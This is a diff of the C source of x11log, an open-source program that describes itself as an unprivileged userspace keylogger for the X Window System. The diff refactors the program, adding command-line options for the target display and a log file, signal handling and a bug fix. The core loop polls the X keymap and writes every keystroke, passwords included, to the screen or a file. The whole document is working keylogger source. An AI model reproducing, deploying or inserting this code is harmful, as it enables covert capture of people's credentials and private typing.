@@ -1,100 +1,62 @@
-/*
- * x11log - an Keylogger for the X Window System
- * (c) Erik Sonnleitner 2007; this is GPLed code.
- * www.delta-xi.net, esonn<at>gmx<dot>net
+/* vim: set ts=4 sw=4: */
+/* -- x11log.c
+ * x11log - an unprivileged, userspace keylogger for X11
+ *
+ * This code is licensed under GPLv3.
+ * (c) Erik Sonnleitner 2007/2011, es@delta-xi.net
+ * www.delta-xi.net
  * */
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <signal.h>    /* signal() */
+#include <unistd.h>    /* getopt() */
+#include <ctype.h>     /* toupper() */
+
+#include <sys/types.h> /* time_t */
+#include <time.h>      /* time(), localtime(), asctime() */
 
 #include <X11/Xlib.h>
 #include <X11/X.h>
 
-#include <sys/types.h>
-#include <sys/time.h>
-#include <signal.h>
-
-#define MAX_KEYLEN 		16
-#define SHIFT_DOWN		1
-#define LOCK_DOWN		2
-#define CONTROL_DOWN	3
-#define DELAY			10000
-
-#define XKBD_WIDTH		32
-#define BYTE_LENGTH		8
-
-#define SWAP(a,b,c) c t;t=a;a=b;b=t;
-
-/* prototypes */
-char* decodeKey(int code, int down, int mod);
-int getMods(char *kbd);
-int getbit(char *kbd, int idx);
-void catch_sigkill(int sig);
+#include "x11log.h"
 
 
-/* global vars */
-char hostname[] = ":0";
-char *kbd, *tmp, *ptr, dump_a[XKBD_WIDTH], dump_b[XKBD_WIDTH];
-FILE *out;
-XModifierKeymap *map;
-Display *dsp;
+/* We only want to detect changed keyboard states, so we declare two keymap
+ * arrays (each holding a X keymap vector), whose contents are swapped in each
+ * iteration in order to recognize changes. Pointers just for readability. */
+static char keymap[2][XKBD_WIDTH],
+		*kbd = keymap[0],
+		*tmp = keymap[1];
+
+static FILE *output;
+static XModifierKeymap *map;
+static Display *dsp;
 
 
-struct remap_struct { char src[20], dst[8];} remap[] = {
-	{"Return","\n"}, {"escape","^["}, {"delete", ">D"}, {"shift",""}, {"control",""}, {"tab","\t"}, {"space", " "},
-	{"exclam", "!"}, {"quotedbl", "\""}, {"numbersign", "#"}, {"dollar", "$"}, {"percent", "%"}, {"ampersand", "&"},
-	{"apostrophe", "'"}, {"parenleft", "("},	{"parenright", ")"}, {"asterisk", "*"}, {"plus", "+"}, {"comma", ","},
-	{"minus", "-"}, {"period", "."},	{"slash", "/"}, {"colon", ":"}, {"semicolon", ";"},	{"less", "<"}, {"equal", "="},	
-	{"greater", ">"},	{"question", "?"}, {"at", "@"}, {"bracketleft", "["}, {"backslash", "\\"}, {"bracketright", "]"},
-	{"asciicircum", "^"},	{"underscore", "_"}, {"grave", "`"}, {"braceleft", "{"},	{"bar", "|"}, {"braceright", "}"},
-	{"asciitilde", "~"},	{"odiaeresis","ö"}, {"adiaeresis","ä"}, {"udiaeresis","ü"}, {"Odiaeresis","Ö"}, {"Adiaeresis","Ä"},
-	{"Udiaeresis","Ü"}, {"ssharp","ß"}, {"",""}
-};
-
-
-
-/* main () */
+/* Here we go. */
 int main (int argc, char ** argv) {
 	int i;
-	time_t rawtime;
-	struct tm * timeinfo;
+	struct tm *timestart;
+	struct opts_struct opts;
 
-	out = stdout;
+	timestart = initialize(argc, argv, &opts);
 
-	/* connect signals to handler-functions */
-	signal(SIGTERM, catch_sigkill);
-	signal(SIGINT, catch_sigkill);
 
-	/* just for logging */
-	time(&rawtime);
-	timeinfo = (struct tm*)localtime(&rawtime);
-
-	/* if argument is given, log to file */
-	if(argc == 2) {
-		printf("Logging to file %s\n", argv[1]);
-		out = fopen(argv[1], "a");
-		if(!out) {
-			printf("Error writing to %s, fallback to console.\n", argv[1]);
-			out = stdout;
-		}
-	}
-
-	dsp = XOpenDisplay(NULL); //just try default display
-	if(!dsp) {
-		fprintf(stderr, "Cannot open Display\n");
-		return EXIT_FAILURE;
-	}
+	/* NULL defaults to what is given in DISPLAY environment variable. However,
+	 * in some cases (e.g. within a VC) this variable is not set; so better go
+	 * with :0.0, which is the correct default display in 99% of all cases. This
+	 * also works via SSH connections, as long as getuid() user is running X. */
+	dsp = XOpenDisplay( (opts.display) ? opts.display : X_DEFAULT_DISPLAY );
+	if(!dsp)
+		fatal("Cannot open display");
 
 	XSynchronize (dsp, True);
-
 	map = XGetModifierMapping(dsp);
 
-	kbd = dump_a;
-	tmp = dump_b;
-
 	XQueryKeymap(dsp, kbd);
-	fprintf(out, "\n\n--New Session at %s\n", asctime(timeinfo));
+	fprintf(output, "\n\n--New Session at %s\n", asctime(timestart));
 
 	/* we'll only try to find changed keys */
 	for(;; usleep(DELAY)){
@@ -102,17 +64,72 @@ int main (int argc, char ** argv) {
 		XQueryKeymap(dsp, kbd);
 
 		for (i = 0; i < XKBD_WIDTH * BYTE_LENGTH; i++)
-			if(getbit(kbd, i) != getbit(tmp, i)) 
-				if(getbit(kbd, i)){
-					fprintf(out, "%s", (char*)decodeKey(i, getbit(kbd, i), getMods(kbd)));
-					fflush(out);
-				}
+			if(getbit(kbd, i) != getbit(tmp, i) && getbit(kbd, i)) {
+				fprintf(output, "%s", (char*)decodeKey(i, getbit(kbd, i), getMods(kbd)));
+				fflush(output);
+			}
 	}
 }
 
-/*
- * decodeKey(int,int,int)
- * checks keycodes and mods, and return a human-readable interpretation of the keyboard status
+/**
+ * Initialization stuff: parse arguments, define signal handlers, define
+ * output stream, set default options. Returns time when init() finished.
+ * */
+struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
+	int c;
+	time_t rawtime;
+
+	/* connect signals to handler-functions */
+	signal(SIGTERM, signal_handler);
+	signal(SIGINT, signal_handler);
+	signal(SIGHUP, signal_handler);
+
+	/* set default values for cmdline options */
+	opts->display = X_DEFAULT_DISPLAY;
+	opts->logfile = NULL;
+
+	/* parse cmdline arguments */
+	while((c = getopt(argc, argv, "d:f:h?")) != -1){
+		switch(c) {
+			case 'd':
+				opts->display = optarg;
+				break;
+			case 'f':
+				opts->logfile = optarg;
+				break;
+			case 'h':
+			case '?':
+				fprintf(stderr, " usage: %s [OPTION]\n", argv[0]);
+				fprintf(stderr, " Available options:\n");
+				fprintf(stderr, "\t-d <DISPLAY>   X-Display to use, default is :0.0\n");
+				fprintf(stderr, "\t-f <LOGFILE>   Log keystrokes to file instead of STDOUT. Text is appended; creates file if necessary.\n");
+				exit(EXIT_FAILURE);
+			default:
+				break;
+		}
+	}
+
+	/* log to file if given, use stdout otherwise  */
+	if(opts->logfile == NULL) {
+		fprintf(stderr, "Logging to stdout\n");
+		output = stdout;
+	} else {
+		fprintf(stderr, "Logging to file %s\n", opts->logfile);
+		output = fopen(opts->logfile, "a");
+		if(!output) {
+			fprintf(stderr, "Error writing to %s, fallback to console.\n", argv[1]);
+			output = stdout;
+		}
+	}
+
+	/* just for logging */
+	rawtime = time(NULL);
+	return localtime(&rawtime);
+}
+
+/**
+ * checks keycodes and mods, and returns a human-readable interpretation of the
+ * keyboard status.
  * */
 char* decodeKey(int code, int down, int mod) {
 	static char *str, dump[MAX_KEYLEN + 1];
@@ -141,7 +158,9 @@ char* decodeKey(int code, int down, int mod) {
 
 	/* no remapping, but "long" keysym */
 	if(dump[1] && !remapChar) {
-		(down) ? sprintf(dump, "%s%s%s", "[+", str, "]") : sprintf(dump, "%s%s%s", "[-", str, "]");
+		(down)
+			? sprintf(dump, "%s%s%s", "[+", str, "]")
+			: sprintf(dump, "%s%s%s", "[-", str, "]");
 		return dump;
 	}
 
@@ -149,14 +168,13 @@ char* decodeKey(int code, int down, int mod) {
 		sprintf(dump, "%c%c%c", '^', dump[0], '\0');
 
 	if(mod == LOCK_DOWN) 
-		dump[0] == toupper(dump[0]);
+		dump[0] = toupper(dump[0]);
 
 	return dump;
 }
 
-/*
- * getMods(char*)
- * reads the mod key(s) out of the current keyboard status and returns the given mods
+/**
+ * Read the mod key(s) of the keymap state and return the present mods
  * */
 int getMods(char *kbd) {
 	int i;
@@ -179,17 +197,40 @@ int getMods(char *kbd) {
 	return 0;
 }
 
-/* reads exactly one bit of an char array, at position idx */
+/**
+ * Retrieve one specific bit (idx) of a keymap vector
+ * */
 int getbit(char *kbd, int idx) {
 	return kbd[idx/8] & (1<<(idx%8));
 }
 
-/* catches signals .. ends application */
-void catch_sigkill(int sig) {
-	fprintf(stdout, "\n -- x11log terminated.\n");
-	if(out != stdout)
-		fclose(out);
 
-	exit(EXIT_SUCCESS);
+/**
+ * Signal handler for SIGTERM, SIGINT and SIGHUP
+ * */
+void signal_handler(int sig) {
+	switch(sig) {
+	  //SIGINT and SIGTERM quit application
+	  case(SIGINT):
+	  case(SIGTERM):
+		fprintf(stderr, "\n -- x11log terminated.\n");
+		if(output != stdout)
+			fclose(output);
+
+		exit(EXIT_SUCCESS);
+	  //SIGHUP forces flushing of buffer
+	  case(SIGHUP):
+		fprintf(stderr, "\n -- SIGHUP: log flushed.\n");
+		fflush(output);
+	  	return; 
+	}
 }
 
+/**
+ * fatal: Print error message and abort execution.
+ * */
+void fatal(const char * msg){
+	if(msg != NULL)
+		fprintf(stderr, "Fatal: %s.\n", msg);
+	exit(EXIT_FAILURE);
+}
